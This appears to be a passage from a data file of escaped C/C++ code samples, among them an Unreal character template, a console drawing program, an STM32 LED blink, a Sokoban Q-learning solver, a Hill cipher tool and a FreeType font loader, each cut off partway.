defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"PosterRoomSandboxCharacter.h\"\n#include \"Engine/LocalPlayer.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"GameFramework/Controller.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"InputActionValue.h\"\n\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\n\n//////////////////////////////////////////////////////////////////////////\n// APosterRoomSandboxCharacter\n\nAPosterRoomSandboxCharacter::APosterRoomSandboxCharacter()\n{\n\t// Set size for collision capsule\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 96.0f);\n\t\t\n\t// Don't rotate when the controller rotates. Let that just affect the camera.\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n\t// Configure character movement\n\tGetCharacterMovement()->bOrientRotationToMovement = true; // Character moves in the direction of input...\t\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 500.0f, 0.0f); // ...at this rotation rate\n\n\t// Note: For faster iteration times these variables, and many more, can be tweaked in the Character Blueprint\n\t// instead of recompiling to adjust them\n\tGetCharacterMovement()->JumpZVelocity = 700.f;\n\tGetCharacterMovement()->AirControl = 0.35f;\n\tGetCharacterMovement()->MaxWalkSpeed = 500.f;\n\tGetCharacterMovement()->MinAnalogWalkSpeed = 20.f;\n\tGetCharacterMovement()->BrakingDecelerationWalking = 2000.f;\n\tGetCharacterMovement()->BrakingDecelerationFalling = 1500.0f;\n\n\t// Create a camera boom (pulls in towards the player if there is a collision)\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->TargetArmLength = 400.0f; // The camera follows at this distance behind the character\t\n\tCameraBoom->bUsePawnControlRotation = true; // Rotate the arm based on the controller\n\n\t// Create a follow camera\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName); // Attach the camera to the end of the boom and let the boom adjust to match the controller orientation\n\tFollowCamera->bUsePawnControlRotation = false; // Camera does not rotate relative to arm\n\n\t// Note: The skeletal mesh and anim blueprint references on the Mesh component (inherited from Character) \n\t// are set in the derived blueprint asset named ThirdPersonCharacter (to avoid direct content references in C++)\n}\n\nvoid APosterRoomSandboxCharacter::BeginPlay()\n{\n\t// Call the base class  \n\tSuper::BeginPlay();\n}\n\n//////////////////////////////////////////////////////////////////////////\n// Input\n\nvoid APosterRoomSandboxCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\t// Add Input Mapping Context\n\tif (APlayerController* PlayerController = Cast<APlayerController>(GetController()))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t\t}\n\t}\n\t\n\t// Set up action bindings\n\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerInputComponent)) {\n\t\t\n\t\t// Jumping\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Started, this, &ACharacter::Jump);\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Completed, this, &ACharacter::StopJumping);\n\n\t\t// Moving\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &APosterRoomSandboxCharacter::Move);\n\n\t\t// Looking\n\t\tEnhancedInputComponent->BindAction(LookAction, ETriggerEvent::Triggered, this, &APosterRoomSandboxCharacter::Look);\n\t}\n\telse\n\t{\n\t\tUE_LOG(LogTemplateCharacter, Error, TEXT(\"'%s' Failed to find an Enhanced Input component! This template is built to use the Enhanced Input system. If you intend to use the legacy system, then you will need to update this C++ file.\"), *GetNameSafe(this));\n\t}\n}\n\nvoid APosterRoomSandboxCharacter::Move(const FInputActionValue& Value)\n{\n\t// input is a Vector2D\n\tFVector2D MovementVector = Value.Get<FVector2D>();\n\n\tif (Controller != nullptr)\n\t{\n\t\t// find out which way is forward\n\t\tconst FRotator Rotation = Controller->GetControlRotation();\n\t\tconst FRotator YawRotation(0, Rotation.Yaw, 0);\n\n\t\t// get forward vector\n\t\tconst FVector ForwardDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::X);\n\t\n\t\t// get right vector \n\t\tconst FVector RightDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::Y);\n\n\t\t// add movement \n\t\tAddMovementInput(ForwardDirection, MovementVector.Y);\n\t\tAddMovementInput(RightDirection, MovementVector.X);\n\t}\n}\n\nvoid APosterRoomSandboxCharacter::Look(const FInputActionValue& Value)\n{\n\t// input is a Vector2D\n\tFVector2D LookAxisVector = Value.Get<FVector2",
    "#include <iostream>\r\n#include <cmath>\r\n#include <vector>\r\n#include <fstream>\r\n#include <windows.h>\r\n#include <sstream>\r\n\r\n// constantes predefinidas en Windows para manejar atributos de color y tamano de texto en la consola\r\nconst int MAX_ALTO_PANTALLA = 25;\r\nconst int MAX_ANCHO_PANTALLA = 80;\r\nconst int COLOR_ROJO = FOREGROUND_RED | FOREGROUND_INTENSITY;\r\nconst int COLOR_VERDE = FOREGROUND_GREEN | FOREGROUND_INTENSITY;\r\nconst int COLOR_AZUL = FOREGROUND_BLUE | FOREGROUND_INTENSITY;\r\n\r\n// Variables Globales para el manejo del estado de la pantalla y el cursor\r\nint xPantalla = MAX_ANCHO_PANTALLA, yPantalla = MAX_ALTO_PANTALLA;\r\nchar contPantalla[MAX_ALTO_PANTALLA][MAX_ANCHO_PANTALLA];\r\nWORD colorPantalla[MAX_ALTO_PANTALLA][MAX_ANCHO_PANTALLA];\r\nchar caracDibujo = '*'; // Caracter por defecto para dibujar figuras\r\nint cursorX = xPantalla / 2, cursorY = yPantalla / 2; // Inicializacion del cursor al centro de la pantalla\r\nint menuY = 0; // Linea inicial para el menu lateral\r\n\r\n// Enumeraciones para representar tipos de figuras y direcciones de movimiento\r\nenum Figura { TRIANGULO, CUADRADO, RECTANGULO, CIRCULO, LINEA, ROMBO, HEXAGONO };\r\nenum Direccion { ARRIBA = 1, ABAJO, IZQUIERDA, DERECHA, DIAG_ARR_IZQ, DIAG_ARR_DER, DIAG_ABJ_IZQ, DIAG_ABJ_DER };\r\n\r\n// Declaraciones de funciones\r\nvoid procesarTeclaFuncion(int tecla);\r\nvoid moverCursor(int dx, int dy);\r\nvoid calcularPosicionCircular(int &x, int &y);\r\nvoid limpiarPantalla();\r\nvoid grabarPantalla();\r\nvoid abrirArchivo(const std::string &nombreArchivo);\r\nvoid dibujarFigura(int x, int y, int orientacion, int size1, int size2, WORD color, Figura figura, char carac);\r\nvoid dibujarLinea(int x, int y, Direccion direccion, int longitud, WORD color, char carac);\r\nvoid modificarOpciones();\r\nWORD seleccionarColor();// WORD es un tipo de dato definido en el encabezado de Windows (Windows.h) Representa un entero sin signo de 16 bits (2 bytes)\r\n//Uso: Se utiliza en este contexto para manejar atributos de color en la consola.\r\nint seleccionarOrientacion();\r\nchar seleccionarCaracter();\r\nvoid mostrarMenuSeleccion();\r\nvoid mostrarMenuPrincipal();\r\nvoid mostrarSubMenuColorCaracter();\r\nvoid mostrarSubMenuDireccion();\r\nvoid reiniciarCursorMenu();\r\nvoid moverCursorConsola(int x, int y);\r\nvoid cambiarColor(WORD color);\r\nWORD obtenerColorActual();\r\nvoid restaurarColor(WORD color);\r\nvoid actualizarPantalla();\r\nvoid seleccionarFigura(Figura figuraSeleccionada);\r\n\r\n// Implementacion de funciones\r\n\r\n// Cambia el color del texto en la consola\r\n// Uso: Para establecer el color del texto de salida en la consola\r\n// Mantenimiento: Se podria expandir para cambiar tambien el fondo\r\nvoid cambiarColor(WORD color) {\r\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\r\n}\r\n\r\n/*\r\nLa estructura CONSOLE_SCREEN_BUFFER_INFO contiene informacion sobre el bufer de pantalla de la consola, incluyendo el tamno del bufer, la posicion del cursor y los atributos de texto actuales.\r\n\r\nCampos principales:\r\n- dwSize: Tamano del bufer de pantalla en caracteres (ancho y alto).\r\n- dwCursorPosition: Posicion actual del cursor en la consola.\r\n- wAttributes: Atributos actuales del texto (colores de texto y fondo).\r\n- srWindow: Coordenadas de la ventana de consola (esquina superior izquierda y esquina inferior derecha).\r\n- dwMaximumWindowSize: Tamano maximo de la ventana de consola.\r\n\r\nEsta estructura se usa principalmente con la funcion GetConsoleScreenBufferInfo para recuperar el estado actual de la consola, lo que permite realizar operaciones como obtener y restaurar atributos de color y posicion del cursor.\r\n*/\r\n// Obtiene el color actual del texto en la consola\r\n// Uso: Para recuperar el color actual antes de cambiarlo y restaurarlo despues\r\n// Mantenimiento: No se esperan cambios a menos que se agreguen mas atributos de consola\r\nWORD obtenerColorActual() {\r\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\r\n    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);\r\n    return csbi.wAttributes;\r\n}\r\n/*\r\nSTD_OUTPUT_HANDLE es una constante predefinida en Windows que se utiliza con la funcion GetStdHandle para obtener el manejador del bufer de salida estandar de la consola. Este manejador es esencial para realizar diversas operaciones en la consola, como cambiar el color del texto, mover el cursor y escribir texto en posiciones especificas.\r\n*/\r\n// Mueve el cursor a una posicion especifica en la consola\r\n// Uso: Para posicionar el cursor de texto en coordenadas especificas\r\n// Mantenimiento: Podria mejorarse para validar los limites de la consola\r\nvoid moverCursorConsola(int x, int y) {\r\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), { (SHORT)x, (SHORT)y });\r\n}\r\n\r\n// Mueve el cursor por un desplazamiento dado y actualiza su posicion circularmente\r\n// Uso: Para mover el cursor y envolver su posicion dentro de los limites de la pantalla\r\n// Mantenimiento: Considerar el manejo de casos en los que el desplazamiento lo saque de la pantalla\r\nvoid moverCursor(int dx, int dy) {\r\n    cursorX += ",
    "/*\n *\n * Copyright (c) 2022\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n *\n * Author : Antonio ( Lord Feistel )\n * e-mail : jr.overhead@gmail.com\n * repo   : https://github.com/lord-feistel/stm32_baremetal\n *\n */\n\n\n#include <cstdint>\n\nclass Util{\n\n    public:\n      // On the next example we will replace it by a timer   \n      static void getSomeSleep(uint32_t some)\n      {\n\n            for (int i {}; i < some; i++)\n              // just to show that is \n              //possible use nop sequence \n              // for that\n                __asm__(\"nop\"); \n      }\n\n};\n\nclass GPIO_LED {\n\npublic:\n\n  // class constructor will arrange the pin configuration\n  GPIO_LED() \n  {\n\n    // I kept the almost the same names of the register\n    // in the  reference manual. It makes easier\n    // understanding what is happening.\n\n    this->RCC_APB2ENR = (volatile uint32_t *)(RCC_BASE + RCC_APB2ENR_OFFSET);\n    this->GPIOC_CRH = (volatile uint32_t *)(GPIOC_BASE + GPIOC_CRH_OFFSET);\n    this->GPIOC_ODR = (volatile uint32_t *)(GPIOC_BASE + GPIOC_ODR_OFFSET);\n\n    // Enables clock on GPIO C\n    *(this->RCC_APB2ENR) |= RCC_IOPCEN;\n    // Enabling only GPIOC 13 as output\n    *(this->GPIOC_CRH) |= GPIO_13_CONF;\n  }\n\n  // set pin\n  void setPin() { *(this->GPIOC_ODR) |= GPIOC13; }\n  // unset pin\n  void cleanPin() { *(this->GPIOC_ODR) &= ~GPIOC13; }\n\n\nprivate:\n\n  // Registers base address ///////////////////////////\n\n  // please check the section 3.3 memory map\n  // on the reference manual\n\n\n  // Reset and clock control RCC\n  // fromt 0x40021000 to 0x400213FF  \n\n  // It's used to enable peripherals e.g. GPIO pins, i2c. \n  \n  // The base address is the start address of certain group of \n  // control registers on this case\n  \n  // Start address of Reset and clock control RCC\n  const uint32_t RCC_BASE = 0x40021000;\n\n  // Start of address of GPIO C configurations\n  const uint32_t GPIOC_BASE = 0x40011000;\n\n  // Offsets inside registers /////////////////////////////\n  // please check section 3.3 memory map\n  // for further details.\n\n  // APB2 peripheral clock enable register\n  const uint32_t RCC_APB2ENR_OFFSET = 0x18;\n  // Port configuration register high\n  const uint32_t GPIOC_CRH_OFFSET = 0x04;\n  // Port output data register\n  const uint32_t GPIOC_ODR_OFFSET = 0x0C;\n  // used to set the bit 21 of GPIOC_CRH\n  // enabling the GPIOC pin 13 as output\n  const uint32_t GPIO_13_CONF = (1<<21);\n\n\n  // Bit labels ////////////////////////////////////////////\n  // Used on bit manipulation\n  const uint32_t RCC_IOPCEN = (1 << 4);\n  const uint32_t GPIOC13 = (1UL << 13);\n\n  // Variables used on the configuration //////////////////\n  volatile uint32_t * RCC_APB2ENR;\n  volatile uint32_t * GPIOC_CRH;\n  volatile uint32_t * GPIOC_ODR;\n\n};\n\nint main(void) \n{\n\n  GPIO_LED led;\n\n  while (1) \n  {\n    Util::getSomeSleep(50000);\n    led.setPin();\n    Util::getSomeSleep(50000);\n    led.cleanPin();\n\n  }\n}\n",
    "// \u00da\u00e3\u00e1 \u00c7\u00e1\u00d8\u00e1\u00c7\u00c8:\r\n// \u00cd\u00c7\u00ca\u00e3 \u00e3\u00cd\u00e3\u00cf \u00da\u00ed\u00cf \u00cd\u00e1\u00e3\u00ed \u00c7\u00e1\u00e5\u00d4\u00e1\u00e3\u00e6\u00e4 211139\r\n// \u00e3\u00e4\u00cc\u00cf \u00e4\u00c7\u00c6\u00e1 \u00d1\u00c8\u00da\u00ed \u00c7\u00e1\u00ca\u00e3\u00ed\u00e3\u00ed 211069\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <set>\r\n#include <map>\r\n#include <cmath>\r\n#include <stack>\r\nusing namespace std;\r\n\r\nconst int stateSize = 7;\r\nconst int boxValue = 50;\r\nconst int goalValue = 5000;\r\nvector<vector<double>> Qtable(0, vector<double>(4));\r\nvector<vector<double>> Rtable(0, vector<double>(4));\r\nmap<vector<vector<int>>, int> states;\r\nint nextState = 0;\r\n\r\nint dx[] = { 1, -1, 0, 0 };\r\nint dy[] = { 0, 0, 1, -1 };\r\n\r\nvector<vector<int>> init()\r\n{\r\n\tvector<vector<int>> state = {\r\n\t\t   {1,1,1,1,1,1,1},\r\n\t\t   {1,0,0,0,3,0,1},\r\n\t\t   {1,2,0,0,2,0,1},\r\n\t\t   {1,0,1,0,0,2,1},\r\n\t\t   {1,3,0,0,0,3,1},\r\n\t\t   {1,0,0,0,0,0,1},\r\n\t\t   {1,1,1,1,1,1,1}\r\n\t};\r\n\r\n\treturn state;\r\n}\r\n\r\nbool isGoal(vector<vector<int>> state)\r\n{\r\n\tbool yes = true;\r\n\tfor (int i = 0; i < state.size(); i++)\r\n\t{\r\n\t\tfor (int j = 0; j < state[i].size(); j++)\r\n\t\t{\r\n\t\t\tif (state[i][j] == 2)\r\n\t\t\t{\r\n\t\t\t\tyes = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (!yes)\r\n\t\t\tbreak;\r\n\t}\r\n\r\n\treturn yes;\r\n}\r\n\r\nbool isDeadlock(vector<vector<int>> state)\r\n{\r\n\r\n\tint xSize = state.size();\r\n\tint ySize = state[0].size();\r\n\tvector<pair<int, int>> boxes;\r\n\tfor (int i = 0; i < xSize; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < ySize; j++)\r\n\t\t{\r\n\t\t\tif (state[i][j] == 2)\r\n\t\t\t{\r\n\t\t\t\tboxes.push_back({ i, j });\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tfor (auto box : boxes) {\r\n\t\tint count = 0;\r\n\t\tbool xchange = false, ychange = false;\r\n\t\tfor (int i = 0; i < 4; i++)\r\n\t\t{\r\n\t\t\tint x = box.first, y = box.second;\r\n\r\n\t\t\tif (state[x + dx[i]][y + dy[i]] == 1 || state[x + dx[i]][y + dy[i]] == 2 || state[x + dx[i]][y + dy[i]] == 4)\r\n\t\t\t{\r\n\t\t\t\tcount++;\r\n\r\n\r\n\t\t\t\tif (xchange && dx[i] != 0)\r\n\t\t\t\t\tcount--;\r\n\t\t\t\telse if (ychange && dy[i] != 0)\r\n\t\t\t\t\tcount--;\r\n\r\n\t\t\t\tif (dx[i] != 0)\r\n\t\t\t\t{\r\n\t\t\t\t\txchange = true;\r\n\t\t\t\t\tychange = false;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\txchange = false;\r\n\t\t\t\t\tychange = true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t}\r\n\r\n\t\tif (count > 1)\r\n\t\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\n\r\nint getGoalCount(vector<vector<int>> state)\r\n{\r\n\tint goalCount = 0;\r\n\tfor (int i = 0; i < stateSize; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < stateSize; j++)\r\n\t\t{\r\n\t\t\tif (state[i][j] == 4)\r\n\t\t\t\tgoalCount++;\r\n\t\t}\r\n\t}\r\n\r\n\treturn goalCount;\r\n}\r\n\r\nvoid initializeStateStructures(vector<vector<int>> state)\r\n{\r\n\tstates[state] = nextState;\r\n\tvector<double> init = { 0,0,0,0 };\r\n\tQtable.push_back(init);\r\n\tRtable.push_back(init);\r\n\r\n\tnextState++;\r\n}\r\n\r\nvector<vector<int>> generateChild(vector<vector<int>> state, int x, int y, bool& boxGoal, int action)\r\n{\r\n\tint stateNum = states[state];\r\n\tint nextX = x + dx[action];\r\n\tint nextY = y + dy[action];\r\n\r\n\tbool valid = nextX >= 0 && nextX < state.size() && nextY >= 0 && nextY < state[x].size();\r\n\tif (!valid)\r\n\t\treturn state;\r\n\r\n\tvector<vector<int>> child = state;\r\n\tswitch (state[nextX][nextY])\r\n\t{\r\n\tcase 0:\r\n\t\tchild[x][y] = 0;\r\n\t\tchild[nextX][nextY] = 5;\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tint beyondX = x + 2 * dx[action];\r\n\t\tint beyondY = y + 2 * dy[action];\r\n\r\n\t\tvalid = beyondX >= 0 && beyondX < state.size() && beyondY >= 0 && beyondY < state[x].size();\r\n\t\tif (!valid)\r\n\t\t\tbreak;\r\n\r\n\t\tswitch (state[beyondX][beyondY])\r\n\t\t{\r\n\t\tcase 0:\r\n\t\t\tchild[x][y] = 0;\r\n\t\t\tchild[nextX][nextY] = 5;\r\n\t\t\tchild[beyondX][beyondY] = 2;\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tchild[x][y] = 0;\r\n\t\t\tchild[nextX][nextY] = 5;\r\n\t\t\tchild[beyondX][beyondY] = 4;\r\n\r\n\t\t\tboxGoal = true;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tbreak;\r\n\t}\r\n\r\n\treturn child;\r\n}\r\n\r\nvector< vector<vector<int>> > generateChildren(vector<vector<int>>& state)\r\n{\r\n\tvector <vector<vector<int>>> children;\r\n\tint stateNum = states[state];\r\n\r\n\tint x = -1, y = -1;\r\n\tfor (int i = 0; i < state.size(); i++)\r\n\t{\r\n\t\tfor (int j = 0; j < state[i].size(); j++)\r\n\t\t{\r\n\t\t\tif (state[i][j] == 5)\r\n\t\t\t{\r\n\t\t\t\tx = i, y = j;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (x != -1)\r\n\t\t\tbreak;\r\n\t}\r\n\r\n\tint nextX, nextY;\r\n\tfor (int i = 0; i < 4; i++)\r\n\t{\r\n\t\tbool boxGoal = false;\r\n\t\tvector<vector<int>> child = generateChild(state, x, y, boxGoal, i);\r\n\r\n\t\tif (boxGoal)\r\n\t\t{\r\n\t\t\tif (isGoal(child))\r\n\t\t\t\tRtable[stateNum][i] = goalValue;\r\n\t\t\telse\r\n\t\t\t\tRtable[stateNum][i] = boxValue;\r\n\t\t}\r\n\r\n\t\tif (states[child] == 0)\r\n\t\t{\r\n\t\t\tinitializeStateStructures(child);\r\n\t\t}\r\n\r\n\t\tchildren.push_back(child);\r\n\t}\r\n\r\n\treturn children;\r\n}\r\n\r\nvector<pair<int, int>> getAvailableStates(vector<vector<int>> state)\r\n{\r\n\tvector<pair<int, int>> available;\r\n\tfor (int i = 0; i < state.size(); i++)\r\n\t{\r\n\t\tfor (int j = 0; j < state[i].size(); j++)\r\n\t\t{\r\n\t\t\tif (state[i][j] == 0)\r\n\t\t\t\tavailable.push_back({ i, j });\r\n\t\t}\r\n\t}\r\n\r\n\treturn available;\r\n}\r\n\r\nvoid QLearn(vector<vector<int>> emptyState, int iterations, double gamma)\r\n{\r\n\tvector<pair<int, int>> availableStates = getAvailableStates(emptyState);\r\n\tvector<vector<int>> state;\r\n\tfor (int i = 0; i < iterations; i++)\r\n\t{\r\n\t\tstate = emptyState;\r\n\t\tpair<int, int> agentLoc = availableStates[rand() % availableStates.size()];\r\n\t\tstate[agentLoc.first][agentLoc.second] = 5;\r\n\t\tinitializeStateStructures(state);\r\n\t\tdo\r\n\t\t{\r\n\t\t\tint stateNum = states[state];\r\n\t\t\tvector< vector<",
    "#include <bits/stdc++.h>\nusing namespace std;\n\ntypedef vector<vector<int>> Matrix;\n\nvoid printMatrix(const Matrix &key){\n    for(const auto &row : key){\n        for(const auto &elem : row){\n            cout << elem << \" \";\n        }\n        cout << endl;\n    }\n}\n\nvoid to_matrix(Matrix& A, string str){\n    \n    int m = A.size();\n    int n = A[0].size();\n    int t = str.length();\n\n    int k = 0; //char pos\n    for(int j = 0; j < n; j++){\n        for(int i = 0; i < m; i++){\n            if(k < t && str[k] >= 'a' && str[k] <= 'z')\n                A[i][j] = str[k] - 'a';\n            else\n                A[i][j] = 26;\n            k++;\n        }\n    }\n\n    return;\n}\n\nstring to_text(Matrix& cipher){\n\n    int m = cipher.size();\n    int n = cipher[0].size();\n\n    string str = \"\";\n    for(int j = 0; j < n; j++){\n        for(int i = 0; i < m; i++){\n            int offset = (((cipher[i][j]) % 27) + 27) % 27;\n            if(offset < 26){\n                char ch = ('a' + offset);\n                str += ch;\n            }\n            else\n                str += \"_\";\n        }\n    }\n\n    return str;\n}\n\nMatrix multiply_matrix(const Matrix &A, const Matrix &B) {\n    \n    int m = B.size();\n    int n = B[0].size();\n\n    Matrix Ans(m, vector<int>(n));\n\n    for(int i = 0; i < m; i++){\n        for(int j = 0; j < n; j++){\n            Ans[i][j] = 0;\n            for(int k = 0; k < m; ++k){\n                Ans[i][j] += (((A[i][k] + 27) % 27) * (B[k][j] % 27)) % 27;\n                Ans[i][j] %= 27;\n            }\n        }\n    }\n\n    return Ans;\n}\n\nMatrix find_submatrix(const Matrix& A, int r, int c){\n    \n    int n = A.size();\n    Matrix subA(n-1);\n\n    int k = 0;\n    for(int i = 0; i < n; i++){\n        for(int j = 0; j < n; j++){\n            if(i != r && j != c)\n                subA[k].push_back(A[i][j]);\n        }\n        if(i != r) k++;\n    }\n\n    return subA;\n}\n\nint det(const Matrix& A){\n    \n    int n = A.size();\n    if(n == 2)\n        return (A[0][0] * A[1][1]) - (A[0][1] * A[1][0]);\n\n    if(n == 1)\n        return A[0][0];\n\n    int sign = 1, determinant = 0, i = 0;\n    while(i < n){\n        Matrix sub_matx = find_submatrix(A, 0, i);\n        determinant += A[0][i] * det(sub_matx) * sign;\n        sign = -sign;\n        i++;\n    }\n\n    return determinant;\n}\n\nint modInverse(int a, int m){\n    a = a % m;\n    for(int x = -m; x < m; x++)\n        if ((a * x) % m == 1)\n            return x;\n    return -1; // If no modular inverse exists\n}\n\nvoid inverse_matrix(Matrix& A){\n    int n = A.size();\n    int detA = det(A);\n\n    if (detA == 0)\n        throw runtime_error(\"Matrix is singular and cannot be inverted.\");\n\n    Matrix invA(n, vector<int>(n));\n    int modInv = modInverse(detA, 27);\n\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            Matrix subA = find_submatrix(A, i, j);\n            int cofactor = det(subA);\n            invA[j][i] = ((cofactor * ((i + j) % 2 == 0 ? 1 : -1)) * modInv) % 27;\n        }\n    }\n\n    for(int i = 0; i < n; i++)\n        for(int j = 0; j < n; j++)\n            A[i][j] = invA[i][j];\n        \n    return;\n}\n\nvoid get_key(Matrix& key, int n){\n    for(int i = 0; i < n; i++){\n        for(int j = 0; j < n; j++){\n            cin >> key[i][j];\n        }\n    }\n\n    if(det(key) == 0){\n        puts(\"Invalid key! det(key) = 0;\");\n        get_key(key, n);\n    }\n}\n\n    /* Notes for reference\n    key matrix size: m x m\n    text matrix size: m x n\n    */\n\nstring encode(string text, Matrix& key){\n\n    transform(text.begin(), text.end(), text.begin(), ::tolower);\n\n    int m = key.size();\n    int n = (text.length() + m - 1) / m;\n\n    Matrix plain(m, vector<int>(n));\n    to_matrix(plain, text);\n\n    Matrix cipher = multiply_matrix(key, plain);\n    \n    return to_text(cipher);\n}\n\nstring decode(string text, Matrix& key){\n\n    int m = key.size();\n    int n = (text.length() + m - 1) / m;\n\n    Matrix cipher(m, vector<int>(n));\n    to_matrix(cipher, text);\n\n    inverse_matrix(key);\n    Matrix plain = multiply_matrix(key, cipher);\n    \n    string decoded = to_text(plain);\n    replace(decoded.begin(), decoded.end(), '_', ' ');\n    decoded.erase(decoded.find_last_not_of(\" \") + 1);\n\n    return decoded;\n}\n\nint main(){\n\n    string text;\n    cout << \"Enter the text: \";\n    getline(cin, text);\n    transform(text.begin(), text.end(), text.begin(), ::tolower);\n\n    int n = -1;\n    cout << \"Enter the key size (2 to 5): \";\n    cin >> n;\n    while(n < 2){\n        cout << \"Invalid key size!\\nEnter the key size (2 to 5): \";\n        cin >> n;\n    }\n\n    Matrix key(n, vector<int>(n));\n    cout << \"Enter the key matrix:\\n\";\n    get_key(key, n);\n\n    int operation = -1;\n    cout << \"1. Encode\\n2. Decode\\nSelect operation (Enter 1 or 2): \";\n    cin >> operation;\n    while(operation != 1 && operation != 2){\n        cout << \"Invalid operation code!\\n1. Encode\\n2. Decode\\nSelect operation (Enter 1 or 2): \";\n        cin >> operation;\n    }\n\n    if(operation == 1)\n        cout << \"Encoded text:\\n\" << encode(text, key);\n    else\n        ",
    "#include \"com/font.h\"\n#include <alib/astring.h>\n\nusing namespace std;\nusing namespace me;\n\nbool me::MemFont::inited = false;\nFT_Library me::MemFont::library = NULL;\nFT_Matrix me::MemFont::italicMatrix;\n\nMemFont::MemFont(unsigned int font_size,unsigned int def_atrribute,unsigned int bs){\n    attribute = def_atrribute;\n    this->font_sizexy = font_size;\n\n    face = NULL;\n    bold_strengthxy = bs;\n\n    ///Init Library\n    if(!MemFont::inited){\n        MemFont::inited = true;\n        FT_Error err = FT_Init_FreeType(&library);\n        if(err){\n            ME_SIV(\"Freetype has failed to be inited!\",0);\n            MemFont::inited = false;\n        }else{\n            atexit([]{\n                FT_Done_FreeType(library);\n            });\n            italicMatrix.xx = 1 << 16;\n            italicMatrix.xy = 0x5800;\n            italicMatrix.yx = 0;\n            italicMatrix.yy = 1 << 16;\n        }\n    }\n}\n\nMemFont::~MemFont(){\n    if(face){\n        FT_Done_Face(face);\n    }\n}\n\nint MemFont::LoadFromFile(const char * fp,unsigned int face_index){\n    if(!inited){\n        ME_SIV(\"Freetype hasn't been inited!\",0);\n        return ME_EFONT_BAD_FREETYPE;\n    }\n    if(!fp){\n        ME_SIV(\"empty file path\",0);\n        return ME_ENO_DATA;\n    }\n    ///release old face\n    if(face)FT_Done_Face(face);\n    face = NULL;\n    FT_Error err = FT_New_Face(library,fp,face_index,&face);\n    if(err)return err;\n\n    SetFormat(ME_FONT_ATTR_PARENT);\n    FT_Select_Charmap(face,FT_ENCODING_GB2312);\n    return ME_ENO_ERROR;\n}\n\nint MemFont::LoadFromMem(unsigned char * buffer,unsigned long size,unsigned int face_index){\n    if(!inited){\n        